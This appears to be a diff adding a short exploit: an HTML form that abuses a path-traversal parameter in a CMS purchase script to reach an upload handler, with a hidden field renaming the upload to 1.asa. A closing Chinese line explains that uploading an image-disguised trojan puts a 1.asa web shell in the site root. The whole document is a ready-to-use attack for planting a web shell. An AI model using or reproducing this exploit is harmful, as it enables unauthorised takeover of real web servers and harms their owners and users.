@@ -1,0 +1,7 @@
+<form action=”http://www.8090Sec.com/plus/carbuyaction.php?dopost=return&action=xxx&code=../../include/dialog/select_soft_post” method=”post” enctype=”multipart/form-data” name=”QuickSearch” id=”QuickSearch”>
+ <input type=”hidden” name=”newname” value=”1.asa”>
+ <input type=”file” name=”uploadfile”>
+ <input type=”submit” value=”搜索” name=”QuickSearchBtn”>
+ </form>
+ 
+上传一个图片木马（只改后辍名为图片类型就行），即可在网站根目录生成 1.asa 文件
